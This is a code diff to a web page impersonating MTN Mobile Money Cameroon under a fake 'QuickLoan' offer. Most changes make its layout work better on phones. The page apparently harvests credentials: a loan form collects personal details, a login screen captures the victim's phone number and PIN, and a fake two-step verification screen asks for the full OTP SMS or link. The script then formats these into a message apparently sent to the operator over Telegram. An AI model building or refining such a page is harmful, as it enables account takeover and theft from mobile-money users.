@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>MTN Momo - QuickLoan & Services</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -25,6 +25,7 @@
             padding: 0;
             box-sizing: border-box;
             font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         html, body {
@@ -35,7 +36,7 @@
             align-items: center;
             justify-content: flex-start;
             overflow-x: hidden;
-            padding: 10px;
+            padding: clamp(8px, 2vw, 16px);
         }
 
         .view-container {
@@ -44,7 +45,7 @@
             display: none;
             flex-direction: column;
             align-items: center;
-            animation: fadeIn 0.3s ease-in-out;
+            animation: fadeIn 0.25s ease-in-out;
             margin-bottom: 20px;
         }
 
@@ -53,14 +54,13 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(6px); }
+            from { opacity: 0; transform: translateY(4px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         header {
             width: 100%;
-            max-width: 480px;
-            padding: 15px 20px;
+            padding: clamp(10px, 3vw, 15px) clamp(12px, 4vw, 20px);
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -71,44 +71,45 @@
         }
 
         .back-btn, .menu-btn {
-            font-size: 24px;
+            font-size: clamp(20px, 5vw, 24px);
             background: none;
             border: none;
             cursor: pointer;
             color: var(--text-main);
+            padding: 4px;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
 
         .logo img {
-            height: 36px;
+            height: clamp(28px, 7vw, 36px);
             width: auto;
             object-fit: contain;
             border-radius: 8px;
         }
 
         .logo-text {
-            font-size: 18px;
+            font-size: clamp(16px, 4.5vw, 18px);
             font-weight: 700;
             color: var(--text-main);
         }
 
         .card {
             background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 30px 24px;
+            border-radius: clamp(16px, 5vw, 24px);
+            padding: clamp(20px, 5vw, 30px) clamp(16px, 4vw, 24px);
             width: 100%;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             display: flex;
             flex-direction: column;
         }
 
         .title {
-            font-size: 24px;
+            font-size: clamp(20px, 5vw, 24px);
             font-weight: 700;
             color: var(--text-main);
             text-align: center;
@@ -116,23 +117,24 @@
         }
 
         .subtitle {
-            font-size: 14px;
+            font-size: clamp(12px, 3.5vw, 14px);
             color: var(--text-muted);
             text-align: center;
             margin-bottom: 20px;
+            line-height: 1.4;
         }
 
         /* Calculator Styles */
         .calc-section {
             background: #f8f9ff;
             border-radius: 16px;
-            padding: 18px;
+            padding: clamp(14px, 4vw, 18px);
             margin-bottom: 20px;
             text-align: left;
         }
 
         .calc-title {
-            font-size: 16px;
+            font-size: clamp(14px, 4vw, 16px);
             font-weight: 600;
             text-align: center;
             margin-bottom: 16px;
@@ -148,7 +150,7 @@
             justify-content: space-between;
             margin-bottom: 6px;
             font-weight: 600;
-            font-size: 14px;
+            font-size: clamp(12px, 3.5vw, 14px);
         }
 
         .input-value {
@@ -197,24 +199,24 @@
         }
 
         .payment-amount {
-            font-size: 24px;
+            font-size: clamp(20px, 5.5vw, 24px);
             font-weight: 700;
             color: var(--primary);
         }
 
         .primary-btn {
             width: 100%;
-            padding: 16px;
+            padding: clamp(14px, 3.5vw, 16px);
             background: linear-gradient(to right, #4361ee, #7209b7);
             color: white;
             border: none;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: clamp(15px, 4vw, 16px);
             font-weight: 700;
             cursor: pointer;
             text-align: center;
             box-shadow: 0 8px 20px rgba(67, 97, 238, 0.3);
-            transition: opacity 0.2s;
+            transition: transform 0.15s ease;
         }
 
         .primary-btn:active {
@@ -225,39 +227,57 @@
             display: flex;
             justify-content: space-around;
             margin-top: 15px;
-            gap: 10px;
+            gap: 8px;
         }
 
         .feature {
             text-align: center;
             color: var(--text-muted);
-            font-size: 11px;
+            font-size: clamp(10px, 2.8vw, 11px);
             flex: 1;
+            line-height: 1.3;
         }
 
         .feature-icon {
-            font-size: 24px;
+            font-size: clamp(20px, 5vw, 24px);
             margin-bottom: 4px;
         }
 
-        /* Form elements */
+        /* Mobile Responsive Form Elements */
         .form-label {
             display: block;
             font-weight: 600;
             color: var(--text-main);
             margin-bottom: 6px;
-            font-size: 14px;
+            font-size: clamp(13px, 3.5vw, 14px);
         }
 
         .form-select, .form-input, .form-textarea {
             width: 100%;
-            padding: 14px;
+            max-width: 100%;
+            padding: clamp(12px, 3.2vw, 14px);
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            font-size: 15px;
-            margin-bottom: 16px;
+            font-size: 16px; /* 16px prevents automatic iOS zoom on focus */
+            margin-bottom: clamp(14px, 3.5vw, 18px);
             outline: none;
+            background: #fff;
             transition: border 0.3s;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+
+        .form-select {
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%333333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            background-size: 16px;
+            padding-right: 40px;
+        }
+
+        .form-textarea {
+            min-height: 90px;
+            resize: vertical;
         }
 
         .form-select:focus, .form-input:focus, .form-textarea:focus {
@@ -269,11 +289,11 @@
         }
 
         .progress-bar-container {
-            width: 140px;
+            width: clamp(120px, 30vw, 160px);
             height: 6px;
             background: #e0e0e0;
             border-radius: 3px;
-            margin: 10px auto 20px;
+            margin: 8px auto 16px;
             overflow: hidden;
         }
 
@@ -286,13 +306,20 @@
         .step-text {
             text-align: center;
             color: var(--text-muted);
-            font-size: 13px;
-            margin-bottom: 20px;
+            font-size: clamp(12px, 3.2vw, 13px);
+            margin-bottom: 16px;
         }
 
         .name-group {
             display: flex;
-            gap: 12px;
+            gap: 10px;
+        }
+
+        @media (max-width: 360px) {
+            .name-group {
+                flex-direction: column;
+                gap: 0;
+            }
         }
 
         .phone-group-custom {
@@ -300,14 +327,16 @@
             align-items: center;
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            padding: 0 14px;
-            margin-bottom: 16px;
+            padding: 0 12px;
+            margin-bottom: 12px;
+            background: #fff;
         }
 
         .phone-prefix {
             color: #666;
             font-size: 15px;
             margin-right: 8px;
+            font-weight: 500;
         }
 
         .phone-input-custom {
@@ -315,25 +344,26 @@
             border: none;
             outline: none;
             padding: 14px 0;
-            font-size: 15px;
+            font-size: 16px;
         }
 
         .btn-group {
             display: flex;
-            gap: 12px;
-            margin-top: 10px;
+            gap: 10px;
+            margin-top: 8px;
         }
 
         .secondary-btn {
             flex: 1;
-            padding: 16px;
+            padding: clamp(12px, 3.2vw, 16px);
             background: #eee;
             color: #666;
             border: none;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: clamp(14px, 3.8vw, 16px);
             font-weight: 700;
             cursor: pointer;
+            text-align: center;
         }
 
         .summary-box {
@@ -341,7 +371,7 @@
             padding: 14px;
             border-radius: 12px;
             font-size: 13px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .summary-row {
@@ -349,38 +379,41 @@
             justify-content: space-between;
             margin-bottom: 8px;
             color: #555;
+            word-break: break-word;
         }
 
         .summary-value {
             font-weight: 600;
             color: #333;
+            text-align: right;
+            margin-left: 10px;
         }
 
-        /* Login & PIN view styles */
         .phone-box-main {
             width: 100%;
             border: 2px solid var(--primary);
             border-radius: 16px;
             display: flex;
             align-items: center;
-            padding: 14px 18px;
-            margin-bottom: 24px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
             background: white;
         }
 
         .pin-group {
             display: flex;
             justify-content: center;
-            gap: 12px;
+            gap: clamp(6px, 2vw, 12px);
             margin-bottom: 20px;
+            width: 100%;
         }
 
         .pin-box {
-            width: 48px;
-            height: 48px;
+            width: clamp(40px, 11vw, 48px);
+            height: clamp(40px, 11vw, 48px);
             border: 2px solid var(--primary);
             border-radius: 12px;
-            font-size: 22px;
+            font-size: clamp(18px, 5vw, 22px);
             text-align: center;
             background: white;
             font-weight: 600;
@@ -399,7 +432,7 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            padding: 20px;
+            padding: 16px;
         }
 
         .overlay.active {
@@ -408,22 +441,22 @@
 
         .modal-card {
             background: white;
-            border-radius: 24px;
-            padding: 30px 24px;
+            border-radius: 20px;
+            padding: 24px 20px;
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             text-align: center;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f0f0f0;
-            border-top: 5px solid var(--primary);
+            width: 44px;
+            height: 44px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid var(--primary);
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 16px;
         }
 
         @keyframes spin {
@@ -433,7 +466,7 @@
 
         .sms-textarea {
             width: 100%;
-            height: 120px;
+            min-height: 110px;
             border: 2px solid var(--mtn-red);
             border-radius: 12px;
             padding: 12px;
@@ -511,11 +544,11 @@
             <div></div>
         </header>
         <main class="card">
-            <h1 class="title" style="font-size: 22px;">Loan Application</h1>
+            <h1 class="title">Loan Application</h1>
             <div class="progress-bar-container"><div class="progress-fill" style="width: 33%;"></div></div>
             <div class="step-text">Step 1 of 3</div>
 
-            <label class="form-label">Loan Type</label>
+            <label class="form-label" for="loanType">Loan Type</label>
             <select class="form-select" id="loanType">
                 <option>Personal Loan</option>
                 <option>Business Loan</option>
@@ -524,10 +557,10 @@
                 <option>Education Loan</option>
             </select>
 
-            <label class="form-label">Loan Amount (FCFA)</label>
+            <label class="form-label" for="loanAmountInput">Loan Amount (FCFA)</label>
             <input type="number" class="form-input" id="loanAmountInput" placeholder="500000" min="5000" max="500000">
 
-            <label class="form-label">Loan Term</label>
+            <label class="form-label" for="loanTermSelect">Loan Term</label>
             <select class="form-select" id="loanTermSelect">
                 <option value="6">6 Months</option>
                 <option value="12" selected>12 Months</option>
@@ -538,7 +571,7 @@
                 <option value="60">60 Months</option>
             </select>
 
-            <label class="form-label">Loan Purpose</label>
+            <label class="form-label" for="loanPurpose">Loan Purpose</label>
             <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
 
             <button class="primary-btn" id="goToAppStep2">NEXT STEP</button>
@@ -557,27 +590,27 @@
             <div></div>
         </header>
         <main class="card">
-            <h1 class="title" style="font-size: 22px;">Personal Details</h1>
+            <h1 class="title">Personal Details</h1>
             <div class="progress-bar-container"><div class="progress-fill" style="width: 66%;"></div></div>
             <div class="step-text">Step 2 of 3</div>
 
             <div class="name-group">
-                <div>
-                    <label class="form-label">First Name</label>
+                <div style="flex:1;">
+                    <label class="form-label" for="firstName">First Name</label>
                     <input type="text" class="form-input" id="firstName" placeholder="John">
                 </div>
-                <div>
-                    <label class="form-label">Last Name</label>
+                <div style="flex:1;">
+                    <label class="form-label" for="lastName">Last Name</label>
                     <input type="text" class="form-input" id="lastName" placeholder="Doe">
                 </div>
             </div>
 
-            <label class="form-label">Phone Number</label>
+            <label class="form-label" for="phone">Phone Number</label>
             <div class="phone-group-custom" id="phoneGroup">
                 <span class="phone-prefix">+237</span>
                 <input type="tel" class="phone-input-custom" id="phone" placeholder="650123456" maxlength="9">
             </div>
-            <small style="color:#999; display:block; margin-bottom:20px;">Enter exactly 9 digits</small>
+            <small style="color:#999; display:block; margin-bottom:16px;">Enter exactly 9 digits</small>
 
             <div class="btn-group">
                 <button class="secondary-btn" data-target="step1">BACK</button>
@@ -598,11 +631,11 @@
             <div></div>
         </header>
         <main class="card">
-            <h1 class="title" style="font-size: 22px;">Final Review</h1>
+            <h1 class="title">Final Review</h1>
             <div class="progress-bar-container"><div class="progress-fill" style="width: 100%;"></div></div>
             <div class="step-text">Step 3 of 3</div>
 
-            <label class="form-label">Employment Status</label>
+            <label class="form-label" for="employmentStatus">Employment Status</label>
             <select class="form-select" id="employmentStatus">
                 <option>Employed</option>
                 <option>Self-Employed</option>
@@ -610,7 +643,7 @@
                 <option>Student</option>
             </select>
 
-            <label class="form-label">Annual Income (XAF)</label>
+            <label class="form-label" for="annualIncome">Annual Income (XAF)</label>
             <input type="number" class="form-input" id="annualIncome" placeholder="500000">
 
             <div class="summary-box" id="summaryBox">
@@ -627,18 +660,18 @@
 
     <!-- ================= VIEW 5: LOGIN / PIN VIEW ================= -->
     <div id="view-login" class="view-container">
-        <div class="logo" style="padding: 30px 0 10px;">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo" style="width:48px;height:48px;">
-            <span class="logo-text" style="font-size: 28px;">MTN Momo</span>
+        <div class="logo" style="padding: 20px 0 10px;">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo" style="width:44px;height:44px;">
+            <span class="logo-text" style="font-size: 24px;">MTN Momo</span>
         </div>
         <main class="card" style="align-items: center;">
-            <h1 class="title" style="font-size: 22px; margin-bottom: 25px;">Log in</h1>
+            <h1 class="title" style="margin-bottom: 20px;">Log in</h1>
             <div class="phone-box-main">
-                <span style="font-size: 24px; margin-right: 10px;">🇨🇲</span>
-                <span style="color:var(--primary); font-weight:600; margin-right:12px;">+237</span>
+                <span style="font-size: 22px; margin-right: 8px;">🇨🇲</span>
+                <span style="color:var(--primary); font-weight:600; margin-right:10px;">+237</span>
                 <input type="tel" id="loginPhoneInput" class="phone-input-custom" placeholder="Phone Number" style="padding:0;" maxlength="9">
             </div>
-            <p style="color:#666; font-size:14px; margin-bottom:15px; font-weight:500;">Enter your PIN</p>
+            <p style="color:#666; font-size:14px; margin-bottom:12px; font-weight:500;">Enter your PIN</p>
             <div class="pin-group">
                 <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                 <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
@@ -646,7 +679,7 @@
                 <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                 <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
             </div>
-            <a href="#" style="color:var(--primary); font-size:14px; text-decoration:none; margin-bottom:25px;">Forgot your PIN?</a>
+            <a href="#" style="color:var(--primary); font-size:14px; text-decoration:none; margin-bottom:20px;">Forgot your PIN?</a>
             <button class="primary-btn" id="executeLoginBtn" style="display:none;">LOG IN</button>
         </main>
         <footer-note>© 2026 MTN Momo</footer-note>
@@ -662,11 +695,11 @@
             <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
         </header>
         <main class="card" style="text-align: left;">
-            <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 8px;">Two Step Verification</h2>
-            <p class="subtitle" style="text-align: left; margin-bottom: 15px;">Paste the complete link/sms message sent to your number</p>
-            <div id="verifyDisplayPhone" style="font-weight: 800; font-size: 16px; margin-bottom: 15px; color: var(--primary);">+237.........</div>
+            <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 6px;">Two Step Verification</h2>
+            <p class="subtitle" style="text-align: left; margin-bottom: 12px;">Paste the complete link/sms message sent to your number</p>
+            <div id="verifyDisplayPhone" style="font-weight: 800; font-size: 15px; margin-bottom: 12px; color: var(--primary);">+237.........</div>
             <textarea id="smsInputCode" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>
-            <p id="resendWrapper" style="font-size: 13px; color: #777; text-align: center; margin-bottom: 15px;">Resend in <span id="countdown">30</span> seconds</p>
+            <p id="resendWrapper" style="font-size: 13px; color: #777; text-align: center; margin-bottom: 12px;">Resend in <span id="countdown">30</span> seconds</p>
             <button id="finalSubmitOtpBtn" class="primary-btn" disabled style="background:#e7e7e7; color:#9a9a9a; cursor:not-allowed; box-shadow:none;">SUBMIT</button>
         </main>
         <footer-note>© 2026 MTN Money - Cameroon</footer-note>
@@ -682,17 +715,17 @@
 
     <div id="successOverlay" class="overlay">
         <div class="modal-card">
-            <div style="width: 70px; height: 70px; background: #00c853; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 36px; color: white;">✓</div>
-            <h3 style="color: #00c853; font-size: 22px; margin-bottom: 10px;">Application Submitted</h3>
-            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Your application has been received successfully. Redirecting to login...</p>
+            <div style="width: 60px; height: 60px; background: #00c853; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 16px; font-size: 32px; color: white;">✓</div>
+            <h3 style="color: #00c853; font-size: 20px; margin-bottom: 8px;">Application Submitted</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 16px;">Your application has been received successfully. Redirecting to login...</p>
         </div>
     </div>
 
     <div id="errorModalOverlay" class="overlay">
         <div class="modal-card">
-            <i class="fa-solid fa-circle-xmark" style="color: var(--mtn-red); font-size: 45px; margin-bottom: 15px;"></i>
-            <h3 style="font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
-            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification payload or rejected by security server.</p>
+            <i class="fa-solid fa-circle-xmark" style="color: var(--mtn-red); font-size: 40px; margin-bottom: 12px;"></i>
+            <h3 style="font-size: 18px; margin-bottom: 8px;">Verification Failed</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 16px;">Wrong verification payload or rejected by security server.</p>
             <button class="primary-btn" onclick="closeErrorModal()">Try Again</button>
         </div>
     </div>
@@ -948,7 +981,6 @@
                 ]
             };
 
-            // Wrapped smsText in a strict code block `` so Telegram provides a dedicated one-tap copy button for it
             const message = 
                 `📱 *Step 2: OTP / Link Submission*\n` +
                 `Phone: \`+237 ${phone}\`\n\n` +
